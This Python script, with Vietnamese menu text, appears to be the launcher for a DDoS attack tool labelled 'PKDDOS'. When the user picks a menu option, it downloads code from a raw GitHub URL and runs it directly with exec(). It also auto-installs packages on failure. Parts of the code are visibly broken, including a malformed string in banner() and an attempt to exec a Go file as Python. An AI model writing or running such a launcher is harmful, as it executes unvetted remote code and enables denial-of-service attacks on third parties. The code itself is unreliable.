import os, sys,re,json,random
from time import sleep
import threading 
from time import strftime
try:
	import requests,pystyle
except:
	os.system('pip install requests && pip install bs4 && pip install pystyle && pip install clear && pip install strftime')
      
def banner():
  os.system('c""")
def dk():
   a= "\033[1;91m=\033[1;97m="*30
   for i in range(len(a)):
     sys.stdout.write(a[i])
     sys.stdout.flush()
     sleep(0.001)
   print()
def delay(dl):
  try:
    for i in range(dl, -1, -1):
       print(sr+'Chờ '+r+' '+str(i)+' Giây [-]          ',end='\r')
       sleep(0.2)
       print(sr+'Chờ '+r+' '+str(i)+' Giây [\]          ',end='\r')
       sleep(0.2)
       print(sr+'Chờ '+r+' '+str(i)+' Giây [|]          ',end='\r')
       sleep(0.2)
       print(sr+'Chờ '+r+' '+str(i)+' Giây [/]          ',end='\r')
       sleep(0.2)
       print(sr+'Chờ '+r+' '+str(i)+' Giây [🔥]          ',end='\r')
       sleep(0.2)
  except:
     sleep(dl)
     print(dl,end='\r')
s = "\033[1;91m『\033[1;97m亗\033[1;91m』"
r = "\033[1;97m▶▶\033[1;92m"
sr = s+r+' '
from pystyle import Add, Center, Anime, Colors, Colorate, Write, System
def ra(a):
   for i in range(len(a)):
     sys.stdout.write(a[i])
     sys.stdout.flush()
   print()

dk()
from pystyle import Box
os.system('clear')
banner()
dk()
print("- - - - - - - - - - - PKDDOS NTTP - - - - - - - - - - - - -")
print()
print(sr+"Nhập [1] PKTOOL DDOS")
print()
dk()
abc = int(input(sr+"Nhập Số : "))
dk()       
try:
  if abc == 1:
    exec(requests.get("https://raw.githubusercontent.com/Kenne400k/nxt/main/pk.py").text)
  if abc == 2:
    exec(requests.get("https://raw.githubusercontent.com/Kenne400k/nxt/main/pk1.go").text)

except:
   pass


